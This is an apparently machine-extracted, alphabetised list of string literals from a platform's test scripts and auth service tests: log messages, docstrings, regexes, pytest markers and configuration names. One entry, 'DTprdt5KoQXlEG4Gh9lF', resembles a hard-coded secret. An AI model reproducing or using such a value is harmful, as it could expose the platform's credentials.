    "=== Summary ===",
    "=== Test Results ===",
    "=== Testing Auth Client Environment Detection ===",
    "=== Testing Auth Service Database Connection ===",
    "=== Testing Backend Service Database Connection ===",
    "=== Testing Cloud SQL Connector Availability ===",
    "=== Testing Middleware Environment Defaults ===",
    "=== Testing OAuth Config Fallback ===",
    "=== Testing Schema Defaults ===",
    "=== Top 10 Unjustified Mocks to Fix ===",
    ">",
    "?",
    "@",
    "@/utils/connection-status-utils",
    "@abstractmethod",
    "@domain.com",
    "@example.com",
    "@gmail.com",
    "@localhost:",
    "@mock_justified",
    "@patch",
    "@patch\\([\\'\"]([^\\'\"]*)[\\'\"].*?\\)",
    "@pytest.",
    "@pytest.mark.",
    "@pytest.mark.e2e",
    "@pytest.mark.integration",
    "@pytest.mark.mock_only",
    "@pytest.mark.real_clickhouse",
    "@pytest.mark.real_database",
    "@pytest.mark.real_llm",
    "@pytest.mark.real_redis",
    "@pytest.mark.real_services",
    "@pytest.mark.skip",
    "@pytest.mark.skipif(\n    os.environ.get(\"ENABLE_REAL_LLM_TESTING\") != \"true\",\n    reason=\"Real LLM tests disabled. Set ENABLE_REAL_LLM_TESTING=true to run\"\n)",
    "@pytest.mark.unit",
    "@pytest\\.fixture.*?\\ndef\\s+(\\w+)",
    "@skip",
    "@users.noreply.github.com",
    "A",
    "ABC",
    "ACCESS_TOKEN_EXPIRE_MINUTES",
    "ACCOUNT_LOCKED",
    "ACCOUNT_LOCKOUT_DURATION",
    "ACCOUNT_UNLOCKED",
    "ACT",
    "ACT: ${{ env.ACT }}",
    "ACTION REQUIRED",
    "ACTUALLY",
    "ALL TESTS PASSED",
    "ALLOWED conftest.py files (service-level):",
    "ALLOWED_HOSTS",
    "ALLOW_DEV_LOGIN",
    "ALLOW_PROD_TESTS",
    "ANTHROPIC_API_KEY",
    "API Agents",
    "API Documentation",
    "API Threads List",
    "API URL not found",
    "API Workspaces",
    "API docs are accessible",
    "API docs check failed:",
    "API docs returned status",
    "API endpoint tests",
    "API endpoints test failed",
    "API endpoints test failed:",
    "API endpoints test passed",
    "API key configured",
    "API port",
    "API_BASE_URL",
    "AST analysis failed for",
    "AUTH_BASE_URL",
    "AUTH_FAST_TEST_MODE",
    "AUTH_SERVICE_PORT",
    "AUTH_SERVICE_URL",
    "AUTH_USE_FILE_DB",
    "AUTOCOMMIT",
    "AUTOMATED SPLITTING SUGGESTIONS (",
    "AVAILABLE TEST CATEGORIES",
    "AVAILABLE TEST LEVELS",
    "Accept",
    "Access token duration:",
    "Access-Control-Allow-Origin",
    "Access-Control-Request-Method",
    "Action Required:",
    "Action:",
    "Active connections:",
    "Actual file generation not yet implemented",
    "Actual fixes require force_unsafe=True. Switching to dry-run mode.",
    "Add",
    "Add assertions to",
    "Add caching layer",
    "Add circuit breakers",
    "Add more end-to-end tests (current:",
    "Add pytest markers to test files",
    "Add security checks, request size limits",
    "Added",
    "Added missing typing imports",
    "Added mock imports",
    "Adding pytest markers to test files...",
    "Additional arguments to pass to Jest",
    "Address critical bottlenecks immediately",
    "After examining the performance metrics, here are my recommendations:",
    "Agent-specific tests",
    "Agent-specific tests with real LLMs",
    "Aggregating coverage...",
    "Align Test Imports and Configuration Script\nFixes all test-related import issues and configuration misalignments.",
    "All configured",
    "All critical imports successful!",
    "All syntax errors fixed!",
    "All tests comply with real test requirements!",
    "All tests comply with requirements!",
    "All tests passed! The script is working correctly.",
    "All tests validated successfully",
    "Allow production tests to run (requires explicit flag)",
    "Allowed locations:",
    "Already in correct order",
    "Analysis complete. 3 optimization opportunities identified.",
    "Analysis complete. Suggested creating",
    "Analysis failed:",
    "Analysis for",
    "Analyze current test coverage",
    "Analyze file for splitting",
    "Analyze test mocks in the codebase to identify unjustified mocks.\nBased on testing.xml spectrum levels (L0-L5).",
    "Analyze test reports in time range.",
    "Analyze test size violations and generate improvement suggestions",
    "Analyzing",
    "Analyzing and suggesting fixes for",
    "Analyzing large test file:",
    "Analyzing test pairs...",
    "Analyzing:",
    "Anti-regression hook to prevent conftest.py violations.\nEnsures conftest.py files only exist at service-level directories.",
    "App title should contain 'Auth Service', got:",
    "Applied",
    "Applying known fixes...",
    "Are you ABSOLUTELY SURE you want to proceed? Type 'YES I UNDERSTAND THE RISKS':",
    "Assert Redis key was deleted",
    "Assert Redis key was set",
    "Assert session does not exist in database",
    "Assert session exists in database",
    "Assert session exists in database with expected values",
    "Assert user does not exist in database",
    "Assert user exists in database with expected data",
    "Assert user exists in database with expected values",
    "Assertion Helpers for Auth Service Tests\nCustom assertion functions for common auth testing scenarios.\nProvides clear and reusable assertions with detailed error messages.",
    "AssertionError",
    "AssertionHelpers",
    "Assess quality of existing tests",
    "Async auth operations failed:",
    "Async setup - override in subclasses",
    "Async teardown - override in subclasses",
    "AsyncMock()",
    "AsyncMock\\(",
    "AsyncMock\\(\\)",
    "AsyncMock\\(spec=LLMManager\\)",
    "AsyncTestBase",
    "Attempt to automatically fix violations",
    "Attempting to connect to",
    "Attempting to fix:",
    "AttributeError",
    "AttributeError: '(\\w+)' object has no attribute '(\\w+)'",
    "AttributeError: <module '([\\w\\.]+)'.*> does not have the attribute '(\\w+)'",
    "Audit Log Test Data Factory\nCreates audit log entries for testing authentication events and security monitoring.\nSupports various event types with proper metadata and tracking.",
    "AuditLogFactory",
    "Auth Endpoint:",
    "Auth Health",
    "Auth Service",
    "Auth Service Base Test Classes\nCommon test functionality and base classes for auth service testing",
    "Auth Service Health",
    "Auth Service Integration Reliability Test.\n\nThis test validates that auth service integration is reliable and handles edge cases properly.",
    "Auth Service Integration Tests",
    "Auth Service Staging SSL Failure Tests\n\nSpecific failing tests for auth service SSL parameter issues in staging.\nThese tests reproduce the exact SSL parameter mismatches that cause\n\"unrecognized configuration parameter\" errors.\n\nQA Agent: Auth Service SSL Root Cause Analysis  \nCreated: 2025-08-24\nPurpose: Validate auth-specific SSL parameter handling failures",
    "Auth Service Startup Integration Test\n\nTests the complete auth service startup process including:\n- Module import resolution\n- Database connectivity\n- Redis connectivity  \n- Configuration loading\n- Health endpoint functionality\n- Windows compatibility\n\nThis test verifies that the fixes for the dev launcher startup issues work correctly.",
    "Auth Service Test Configuration Module\nTest configuration and environment management for auth service tests",
    "Auth Service Test Database Module\nDatabase utilities for test isolation and management",
    "Auth Service Test Factories\nTest data factories for creating consistent test data.",
    "Auth Service Test Utilities\nHelper functions and utilities for auth service testing",
    "Auth Service: [green]âœ“ Healthy[/green]",
    "Auth Service: [red]âœ— Not reachable -",
    "Auth Service: [red]âœ— Unhealthy (",
    "Auth Tests - Split from test_oauth_flows.py",
    "Auth URL: [cyan]",
    "Auth decorators not yet implemented",
    "Auth models import failed:",
    "Auth must start before backend",
    "Auth routes import failed:",
    "Auth service URL",
    "Auth service URL not found",
    "Auth service config import failed:",
    "Auth service exited early. Exit code:",
    "Auth service failed to start",
    "Auth service health check failed:",
    "Auth service import failed:",
    "Auth service main not available",
    "Auth service not available",
    "Auth service process cleaned up",
    "Auth service specific test configuration.\nUses consolidated test framework infrastructure with auth-specific customizations.",
    "Auth service started successfully",
    "Auth service startup timed out",
    "Auth should be able to start, missing:",
    "Auth should be in degraded services",
    "AuthConfig should normalize DATABASE_URL",
    "AuthDatabaseManager missing get_auth_database_url_async static method",
    "AuthDatabaseManager must have get_auth_database_url_async method",
    "AuthDatabaseManager must have is_cloud_sql_environment method",
    "AuthDatabaseManager must have is_test_environment method",
    "AuthDatabaseManager must have validate_auth_url method",
    "AuthSessionFactory",
    "AuthTestBase",
    "AuthTestClient",
    "AuthTestEnvironment",
    "AuthTestMixin",
    "AuthTestUtils",
    "AuthUserFactory",
    "Authentication Token Generation Tests - Business Impact\n\nSecurity Foundation: Core Authentication Infrastructure\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance  \n- Foundation for all authentication and authorization in the platform\n\nTechnical Excellence:\n- JWT token generation: access, refresh, and service tokens with proper structure\n- Token claims validation: user ID, email, permissions, and metadata\n- Token timing: consistent generation performance and unique token creation\n- Token type consistency: standardized structure across all token types\n- Expiry configuration: proper token lifetime management for security\n\nPlatform Security:\n- Platform: Secure token generation foundation for all authentication\n- Security: JWT structure compliance for SOC2/GDPR requirements\n- Microservices: Service token generation for inter-service communication\n- Performance: Fast token generation (<1s) for responsive authentication\n- Consistency: Standardized token structure across all authentication flows",
    "Authentication Token Generation Tests - JWT token creation and structure validation\n\nTests JWT token generation with various claims, token types, and security configurations.\nCritical for ensuring secure token creation in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Foundation | Impact: Core Security\n- Ensures secure JWT token generation for all authentication flows\n- Validates token structure and claims for security compliance\n- Foundation for all authentication and authorization in the platform\n\nTest Coverage:\n- Basic access token generation\n- Access tokens with permission claims\n- Refresh token generation with proper structure\n- Service token generation for microservice communication\n- Token structure validation and security compliance",
    "Authentication Token Security Tests - Business Impact\n\nSecurity Foundation: Critical Security Protection ($100K+ MRR)\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTechnical Excellence:\n- Signature verification: tampered token detection and integrity protection\n- Claims extraction: secure claims validation and privilege boundaries\n- Attack prevention: 'none' algorithm, timing attacks, and signature tampering\n- Revocation support: user-based and time-based revocation mechanisms\n- Security boundaries: token type enforcement and privilege separation\n- Timing resistance: consistent validation times to prevent timing attacks\n\nEnterprise Security:\n- Platform: Comprehensive security foundation for enterprise authentication\n- Compliance: Security validation for SOC2/GDPR enterprise requirements\n- Attack Prevention: Protection against common JWT security vulnerabilities\n- Integrity: Signature and claims validation maintains authentication trust\n- Boundaries: Security separation between token types and privileges",
    "Authentication Token Security Tests - Security validation and attack prevention\n\nTests JWT token security features including signature verification, tampering detection,\nrevocation mechanisms, and comprehensive security boundary enforcement.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Security Compliance | Impact: Critical Security\n- Prevents security breaches that could cost $100K+ in damages and reputation\n- Ensures authentication security compliance for enterprise contracts\n- Validates comprehensive security policies and attack prevention\n\nTest Coverage:\n- JWT signature verification and tampering detection\n- Token revocation mechanisms and security lifecycle\n- Claims extraction and security validation\n- Attack prevention and security boundary enforcement\n- Security compliance validation for enterprise requirements",
    "Authentication Token Validation Tests - Business Impact\n\nSecurity Foundation: Authentication Integrity Protection\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTechnical Excellence:\n- Token validation: comprehensive validation for access, refresh, and service tokens\n- Security boundaries: proper token type enforcement and access control\n- Signature verification: tampered token detection and integrity protection\n- Expiry validation: time-based security and token lifecycle management\n- Performance validation: fast token validation (<10ms average) for responsive auth\n- Concurrent validation: thread-safe validation for production scalability\n\nPlatform Security:\n- Platform: Secure token validation foundation for all authentication flows\n- Security: Comprehensive validation prevents security vulnerabilities and attacks\n- Performance: Fast validation ensures responsive authentication experience\n- Boundaries: Token type enforcement prevents privilege escalation\n- Integrity: Signature and timing validation maintains authentication trust",
    "Authentication Token Validation Tests - JWT token validation and security verification\n\nTests JWT token validation scenarios including signature verification, expiry checking,\ntoken type validation, and security boundary enforcement in the auth service.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Core Security\n- Ensures secure JWT token validation across all authentication flows\n- Validates security boundaries and prevents unauthorized access\n- Critical for maintaining authentication integrity in production\n\nTest Coverage:\n- Valid token validation across different token types\n- Invalid token type rejection and security boundaries\n- Token expiry validation and time-based security\n- Signature verification and tampering detection\n- Token structure validation and malformed token handling",
    "Authentication service tests",
    "Authentication test failed:",
    "Authentication:",
    "Authorization",
    "Auto-fix functionality not implemented yet.",
    "Auto-fix linting issues",
    "Auto-fix operations can break your tests!",
    "Auto-generated by Autonomous Test Reviewer with Ultra-Thinking\nGenerated:",
    "Auto-split window size in minutes (default: 15)",
    "Auto-splitting is experimental - manual review required",
    "Automated Test Size Violation Fixer\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity - Enable test runner to function, unblock development pipeline\n- Value Impact: Restores test execution capability, prevents regression accumulation\n- Strategic Impact: $50K+ monthly dev velocity protection through working test infrastructure\n\nThis script automatically fixes test size violations by:\n1. Splitting oversized test files (>300 lines) into focused modules\n2. Extracting common fixtures and utilities\n3. Breaking large test functions (>8 lines) into focused tests\n4. Preserving all test functionality while improving maintainability",
    "Automated test fix loop script.\n\nThis script runs test suite iterations and fixes issues automatically.",
    "Automated test thread",
    "Automatic function refactoring is not supported",
    "Automatically fix identified issues",
    "Automatically fix test size violations",
    "Autonomous Test Review System - Entry Point\nWrapper script for the autonomous test review system",
    "Autonomous Test Review System - Main Reviewer\nMain autonomous test reviewer class for orchestrating analysis and improvements",
    "Autonomous Test Review System - Test Generator\nIntelligent test generation and modernization capabilities",
    "Available CLI tools:",
    "Available categories:",
    "Average Business Value Score:",
    "Average Duration:",
    "Average Success Rate:",
    "Average validation time:",
    "B",
    "BACKEND_PORT",
    "BACKEND_URL",
    "BASE_URL",
    "BATCH PROCESSING COMPLETE",
    "BATCH TEST FIXER",
    "BUSINESS VALUE TEST COVERAGE SUMMARY",
    "BVJ:",
    "BVJ: JWT Validation Tests\n\nSegment: Enterprise & Growth (Critical security infrastructure)\nBusiness Goal: Zero authentication vulnerabilities, secure token validation\nValue Impact:\n- Prevents JWT-based security attacks (signature tampering, algorithm confusion)\n- Enables secure token-based authentication for enterprise features\n- Supports proper token lifecycle management and revocation\n- Protects against expired token usage and claim validation bypasses\n\nStrategic/Revenue Impact: Authentication security foundation for enterprise sales\nCritical for SOC2 compliance and security audit requirements",
    "Backed up",
    "Backend API Health",
    "Backend Auth Required",
    "Backend Health",
    "Backend Integration",
    "Backend Service",
    "Backend Service: [green]âœ“ Healthy[/green]",
    "Backend Service: [red]âœ— Not reachable -",
    "Backend Service: [red]âœ— Unhealthy (",
    "Backend Startup Tests",
    "Backend Tests:",
    "Backend URL: [cyan]",
    "Backend alone should not trigger production, got",
    "Backend health check failed:",
    "Backend integration test failed:",
    "Backend is healthy",
    "Backend must start before frontend",
    "Backend returned status",
    "Backend service URL",
    "Backend service failed to start",
    "Backend service tests",
    "Backend should be in registry",
    "Backend should have started",
    "Backend should not start before auth is ready",
    "Backend unhealthy:",
    "Backups stored in:",
    "Bad file descriptor",
    "Base Test Classes\nCommon functionality for auth service tests with proper setup and teardown.\nFollows 450-line limit with focused test infrastructure.",
    "Base URL",
    "Based on the analysis of your AI workload, I've identified several optimization opportunities.",
    "Basic test setup verification\nEnsures test environment is working correctly",
    "Batch Test Fixer - Systematically fixes test failures\nProcesses tests in batches and either:\n1. Aligns tests with current code\n2. Implements missing functionality if tests are correct",
    "Batch fix known test issues and run test iterations.",
    "Batch processing completed",
    "Bearer",
    "Bearer malformed-token",
    "Bearer test",
    "Bearer test_token_123",
    "Build frontend for production",
    "Building frontend...",
    "Business Value Justification",
    "Business Value Test Index Generator\n\nScans the codebase to create a comprehensive index of all tests,\ncategorized by business value, customer tier, and coverage dimensions.",
    "Business value test coverage report saved to",
    "By Priority:",
    "By Type:",
    "CATEGORY STATISTICS",
    "CI Check for Test Stubs in Production Code\n\nThis script runs as part of the CI/CD pipeline to detect test stubs in production code.\nIt fails the build if any test stubs are found according to SPEC/no_test_stubs.xml.\n\nUsage:\n    python scripts/ci/check_test_stubs.py          # Run check and exit with code\n    python scripts/ci/check_test_stubs.py --quiet  # Minimal output for CI",
    "CI Test Stub Checker",
    "CLICKHOUSE_HOST",
    "CLICKHOUSE_PASSWORD",
    "CLICKHOUSE_URL",
    "CLOSED",
    "CLOSING",
    "COMPLETED",
    "COMPLIANCE ANALYSIS",
    "COMPONENT_MAPPINGS = {\n    \"backend\": {\n        \"paths\": [\"netra_backend/tests\"],\n        \"exclude\": [\"frontend\", \"auth_service\"]\n    },\n    \"frontend\": {\n        \"paths\": [\"frontend/__tests__\"],\n        \"exclude\": []\n    },\n    \"auth\": {\n        \"paths\": [\"netra_backend/tests/auth_integration\", \"auth_service/tests\"],\n        \"exclude\": []\n    },\n    \"agents\": {\n        \"paths\": [\"netra_backend/tests/agents\"],\n        \"exclude\": []\n    },\n    \"database\": {\n        \"paths\": [\"netra_backend/tests/database\", \"netra_backend/tests/clickhouse\"],\n        \"exclude\": []\n    },\n    \"websocket\": {\n        \"paths\": [\"netra_backend/tests/websocket\", \"netra_backend/tests/ws_manager\"],\n        \"exclude\": []\n    }\n}",
    "COMPONENT_MAPPINGS\\s*=\\s*\\{[^}]+\\}",
    "COMPREHENSIVE IMPORT TEST",
    "COMPREHENSIVE TEST FIXER",
    "COMPREHENSIVE TEST IMPORT FIX REPORT",
    "COMPREHENSIVE TEST QUALITY REPORT",
    "CONNECTING",
    "CORS Configuration",
    "CORS configured:",
    "CORS headers not properly configured",
    "CORS test failed:",
    "CORS validation test PASSED",
    "CORS validation test failed:",
    "CORS_ORIGINS",
    "COVERAGE_ENABLED",
    "CPU Intensive:",
    "CPU Utilization:",
    "CREATE DATABASE \"",
    "CRITICAL",
    "CRITICAL (must fix)",
    "CRITICAL FILES (Immediate Attention Required):",
    "CRITICAL GAPS:",
    "CRITICAL IMPORT TEST (Fast-Fail Mode)",
    "CRITICAL violations** found:",
    "CRITICAL: Coverage below 80% - focus on unit test generation for core modules",
    "CRITICAL: Found",
    "CRITICAL: Run all tests immediately to verify nothing is broken!",
    "CSV report saved to",
    "Cache Hit Rate:",
    "Cache Hits:",
    "Cache hit for query",
    "Cache refreshed",
    "Calculating cosine similarities...",
    "Cannot find file for module:",
    "Cascading failure detected",
    "Categories Executed:",
    "Categories with History:",
    "Categories with very few tests:",
    "Category '",
    "Category Results:",
    "Category failed",
    "Category:",
    "CategoryFailure",
    "Changes made:",
    "Character '",
    "Chat flow test failed:",
    "Check environment configuration",
    "Check for inter-class dependencies",
    "Check for memory leaks",
    "Check health of backend and auth services",
    "Check if a service is healthy.",
    "Check test dependencies before running",
    "Check that setup_test_path() is called before any netra_backend imports in test files.",
    "Checked",
    "Checking",
    "Checking configuration...",
    "Checking dependencies...",
    "Checking for conftest.py violations...",
    "Checking for syntax issues...",
    "Checking for test stubs in production code...",
    "Checking imports...",
    "Checking service availability...",
    "Checking tables after transaction...",
    "Circuit breaker opened for service",
    "Circular env.ACT reference found",
    "Classes:",
    "Clean up Node processes on exit (automatic on Windows)",
    "Clean up all data for a specific user",
    "Clean up excess sessions for specific user",
    "Clean up hanging test processes",
    "Clean up resources",
    "Clean up resources.",
    "Cleaning up test processes...",
    "Cleanup cancelled.",
    "Cleanup created test data",
    "Cleanup database connections",
    "Cleanup database objects",
    "Cleanup error:",
    "Clear cache before execution",
    "Cleared Jest cache.",
    "Cleared cache directory:",
    "Client ID:",
    "Client Secret:",
    "Cloud Run staging not detected, got '",
    "Cloud SQL Connector",
    "Cloud SQL URL contains sslmode parameter",
    "Code:",
    "Collected",
    "Command: python",
    "Commands",
    "Complete coordination workflow successful",
    "Complete workflow should succeed",
    "Complete workflow test failed:",
    "Complex async mocking required - tested in integration",
    "Compliance Rate:",
    "Compliant Files:",
    "Component isolation tests (1-2min)",
    "Components:",
    "Comprehensive Fake Test Scan Results",
    "Comprehensive GitHub Workflows Testing with ACT\nTests all workflows locally to validate before pushing to GitHub",
    "Comprehensive OAuth Login Test Suite - Top 30 Common Failures\nTesting Level: L3-L4 (Real services with staging environment integration)\nInitially designed to FAIL to expose real implementation issues\n\nBusiness Value Justification (BVJ):\n- Segment: All (Free, Early, Mid, Enterprise)\n- Business Goal: Security, Retention, Platform Stability\n- Value Impact: Prevents auth failures that directly impact user access and trust\n- Strategic Impact: Critical for platform reliability and user retention\n\nTest Philosophy: L3-L4 Testing\n- L3: Real SUT with real containerized dependencies (PostgreSQL, Redis, etc.)\n- L4: Real SUT deployed in staging environment with all real services\n- Minimal mocking, maximum realism",
    "Comprehensive Test Fixer - Analyzes and fixes all test failures systematically",
    "Comprehensive backend test runner for Netra AI Platform",
    "Comprehensive backend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
    "Comprehensive failing tests for AuthDatabaseManager missing methods.\n\nThese tests explicitly test for the missing methods that are being called\nin auth_service/auth_core/database/connection.py but don't exist in AuthDatabaseManager.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Auth service stability and reliability\n- Value Impact: Ensures critical methods exist and work correctly\n- Strategic Impact: Prevents auth service failures during database initialization",
    "Comprehensive fake test detection and reporting",
    "Comprehensive frontend test runner for Netra AI Platform",
    "Comprehensive frontend test runner for Netra AI Platform\nDesigned for easy use by Claude Code and CI/CD pipelines\nNow with test isolation support for concurrent execution",
    "Comprehensive report saved to",
    "Comprehensive script to fix all test import errors systematically.\nAnalyzes failing test files and fixes common import patterns.",
    "Comprehensive staging deployment validation script.\nTests all critical endpoints and services on staging environment.",
    "Comprehensive suffix",
    "Comprehensive system-wide tests",
    "Comprehensive test size limits validator for Netra testing system.\n\nEnforces SPEC/testing.xml requirements:\n- Test files MUST follow same 450-line limit as production code\n- Test functions MUST follow same 25-line limit as production code\n- Prevents test files from becoming unmaintainable \"ravioli code\"\n\nFeatures:\n- Scans all test files for size violations\n- Reports files exceeding 300 lines\n- Reports functions exceeding 8 lines  \n- Provides refactoring suggestions\n- Can auto-split large test files\n- Integration with test runner",
    "Computed startup order:",
    "Concurrent validation failed:",
    "Confidence:",
    "Config endpoint returned",
    "Config endpoint test failed:",
    "Configuration Loading",
    "Configuration Loading Test",
    "Configuration failed to load",
    "Configuration fixes applied:",
    "Configuration reloaded",
    "Configuration updated successfully.",
    "Configuration validation failed:",
    "Conflicts:",
    "Connected",
    "Connection Status Utils",
    "Connection error",
    "Connection failed",
    "Connection pool exhausted, queuing request",
    "Connection pool usage high",
    "Connection refused: Too many connections",
    "Consider cluster-wide CPU optimization",
    "Consistently Failing Tests:",
    "Contains sslmode parameter for Cloud SQL",
    "Content-Type",
    "Continue anyway? (y/n):",
    "Continue testing even after failures",
    "Coordination should succeed with optional service failures",
    "Core AI optimization delivering 30-50% cost savings for",
    "Core Tests - Split from test_oauth_flows.py",
    "Core functionality unit tests",
    "Corrected test suite for verify_workflow_status.py\n\nTests various scenarios with proper expected behavior validation.",
    "Cost savings of $1,200/month achieved.",
    "Could not auto-fix syntax in:",
    "Could not connect to PostgreSQL on ports 5432 or 5433",
    "Could not parse JSON results:",
    "Could not read file:",
    "Could not save report to",
    "Could not validate test file",
    "Count sessions (optionally for specific user)",
    "Count total sessions in database",
    "Count total users in database",
    "Coverage:",
    "Create OAuth test user in database",
    "Create all database tables",
    "Create audit log entry",
    "Create session cleanup service",
    "Create session in database",
    "Create test database",
    "Create test session in database",
    "Create test user in database",
    "Create user in database",
    "Created",
    "Created UserFlowTestBase using unittest.TestCase",
    "Created backup directory:",
    "Created mock Agent and AgentRun models",
    "Created mock AgentRun model",
    "Created mock ClickHouseManager for tests",
    "Created mock ConversionEvent for tests",
    "Created mock Message model",
    "Created mock Team for tests",
    "Created mock Thread model",
    "Created mock database test fixtures",
    "Created mock user journey data",
    "Created split file:",
    "Created test database:",
    "Created utilities file:",
    "Creating",
    "Creating TF-IDF vectors...",
    "Creating tables...",
    "Creating test session...",
    "Critical",
    "Critical - API endpoints",
    "Critical - Core functionality",
    "Critical - Database",
    "Critical - Security",
    "Critical Auth Service Staging Issues - Failing Tests\nTests that reproduce production errors found in staging environment.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Service reliability and production readiness\n- Value Impact: Prevents auth service failures in staging/production\n- Strategic Impact: Ensures authentication availability for all tiers",
    "Critical Tests (90+ score):",
    "Critical deployment should fail",
    "Critical error after deployment",
    "Critical errors:",
    "Critical path tests that protect revenue",
    "Critical suffix",
    "Current size:",
    "Custom auth exceptions not yet implemented",
    "Custom cache directory",
    "Cypress E2E:",
    "DANGEROUS: Actually perform fixes (NOT RECOMMENDED)",
    "DANGEROUS: Created",
    "DANGEROUS: Disable safe mode protections",
    "DANGEROUS: Second confirmation required for unsafe operations",
    "DANGEROUSLY fixing",
    "DANGEROUSLY split",
    "DATABASE_ECHO_SQL",
    "DATABASE_URL",
    "DATABASE_URL_PLACEHOLDER",
    "DEBUG",
    "DEFAULT_TEST_PATHS = [\n        \"netra_backend/tests\",\n        \"test_framework/tests\",\n        \"frontend/__tests__\",\n        \"auth_service/tests\"\n    ]",
    "DEFAULT_TEST_PATHS\\s*=\\s*\\[[^\\]]+\\]",
    "DELETE",
    "DEMO 1: TEST SIZE VALIDATOR",
    "DEMO 2: TEST REFACTORING HELPER",
    "DEMO 3: TEST RUNNER INTEGRATION",
    "DEMO 4: PROPERLY SIZED TEST EXAMPLES",
    "DEMO 5: CLI USAGE EXAMPLES",
    "DEMONSTRATION COMPLETE",
    "DETAILED ERROR ANALYSIS (first 5 files):",
    "DETAILED REAL E2E TEST INFORMATION",
    "DETAILED REPORT",
    "DETAILED VIOLATIONS:",
    "DEV_DATABASE_URL",
    "DEV_REDIS_URL",
    "DNS resolution failed",
    "DROP",
    "DROP DATABASE IF EXISTS \"",
    "DRY RUN - No files were actually modified",
    "DRY RUN MODE - No files will be renamed",
    "DTprdt5KoQXlEG4Gh9lF",
    "Data integrity and performance for",
    "DataSubAgent Modular",
    "Database Connection",
    "Database Dependent:",
    "Database URL should not be empty",
    "Database connection appears functional",
    "Database connection failed",
    "Database connectivity test failed:",
    "Database engine disposed",
    "Database error",
    "Database initialized:",
    "Database must start before auth",
    "Database session manager import failed:",
    "Database session not configured",
    "Database session not setup",
    "Database should be initialized exactly once, got",
    "Database tables created successfully",
    "Database tables reset",
    "Database test returned status",
    "Database-related tests",
    "Database:",
    "DatabaseTestMixin",
    "DatabaseTestUtils",
    "Debug database test to verify table creation works",
    "Delegating fix to subagent:",
    "Demo failed with error:",
    "Demo script showing the Test Size Limits Enforcement system in action.\n\nThis demonstrates all components of Fix #2: Test Size Limits Enforcement:\n1. Test size validator functionality\n2. Test refactoring helper functionality  \n3. Integration with test runner\n4. Properly sized test examples",
    "Dependencies installed successfully",
    "Dependencies:",
    "Dependency Resolution",
    "Dependency resolution test failed:",
    "Dependency resolution working correctly",
    "Deployment errors:",
    "Description:",
    "Detailed Results:",
    "Detailed error information:",
    "Detailed report saved to:",
    "Detailed results saved to:",
    "Details",
    "Dev OAuth client used in staging",
    "Dev launcher exited unexpectedly",
    "Dev login not enabled",
    "Development Environment",
    "Development environment specific tests",
    "Development server failed to start",
    "Development server started successfully",
    "Development server stopped",
    "Dict",
    "Dict[",
    "Direct cost reduction features for",
    "Directory",
    "Directory does not exist:",
    "Directory for storing backups (auto-generated if not specified)",
    "Directory not found:",
    "Disable automatic test splitting",
    "Disable bad test detection",
    "Disable coverage reporting",
    "Disable result caching",
    "Disconnected",
    "Discovered",
    "Docker is not installed",
    "Docker is not running. Please start Docker first.",
    "Docker services started successfully",
    "Don't wait for services to be healthy",
    "Drop test database",
    "Dropped test database:",
    "Duplicate database module should not exist:",
    "Duplicate test file:",
    "Duplicate test setup code has been removed.",
    "Duplicates Found:",
    "E2E COLD START TEST SUMMARY",
    "E2E Coverage:",
    "E2E Test Import Fixer\n\nAutomatically fixes imports in all moved test files after the test directory reorganization.\nUpdates imports to reflect the new test structure under tests/e2e/.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal (Development velocity protection)\n- Business Goal: Restore broken imports after test reorganization\n- Value Impact: Enables test execution after directory restructuring\n- Strategic Impact: Prevents development velocity loss due to import failures\n\nThis script:\n1. Scans test files in tests/e2e/ subdirectories\n2. Updates imports that reference old paths\n3. Fixes helper imports to use new organized structure\n4. Reports all changes made",
    "E2E Test Thread",
    "ENABLE_REAL_LLM_TESTING",
    "ENVIRONMENT",
    "ENVIRONMENT DETECTION TEST SUITE",
    "ENVIRONMENT=staging:",
    "ERROR",
    "ERROR:",
    "ERROR: Target file already exists:",
    "ERROR: Test stub check failed:",
    "ERROR: setup_test_path() at line",
    "ERRORS:",
    "EXCEPTION (",
    "EXECUTION PLAN",
    "Either --run-id or --workflow-name must be specified",
    "Emergency shutdown initiated",
    "Empty function implementation found",
    "Empty user information",
    "Enable continuous test generation in CI/CD pipeline",
    "Enable coverage reporting",
    "Enables real-time agent interactions for",
    "End-to-End Cold Start Test Suite for Netra Apex Platform\n\nThis comprehensive test validates the entire user flow from cold start through\nauthentication, WebSocket connection, chat interaction, and model response.\n\nCritical Path Tested:\n1. Dev launcher startup with all services\n2. Service discovery and dynamic port handling\n3. Auth service login (dev mode)\n4. Token retrieval and validation\n5. WebSocket connection with auth\n6. Chat message sending\n7. Model processing and response\n8. Clean shutdown\n\nAuthor: Netra Apex Engineering",
    "End-to-End Tests",
    "End-to-end integration tests",
    "End-to-end tests",
    "Endpoint",
    "Enforce maximum sessions per user",
    "Engine not setup. Call setup_engine first.",
    "Engine:",
    "Enhanced Real Test Requirements Enforcer\n\nComprehensive validation and enforcement of SPEC/testing.xml real test requirements\nfor both Python and JavaScript test files.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction  \n- Value Impact: Prevents regression bugs from invalid test patterns\n- Strategic Impact: Ensures test reliability, reduces debugging time, maintains system integrity\n\nSPEC Requirements Enforced:\n1. No mock component implementations inside test files\n2. Integration tests must use real child components\n3. Mock only external APIs and truly unavailable resources\n4. Test files must follow 450-line limit\n5. Test functions must follow 25-line limit\n6. Fix System Under Test first, not tests",
    "Enhanced Registry",
    "Enhanced Test Discovery Report",
    "Enhanced Test Discovery Report\nShows all test categories including real e2e tests prominently.",
    "Ensure file is valid and accessible",
    "Environment to test against (default: test)",
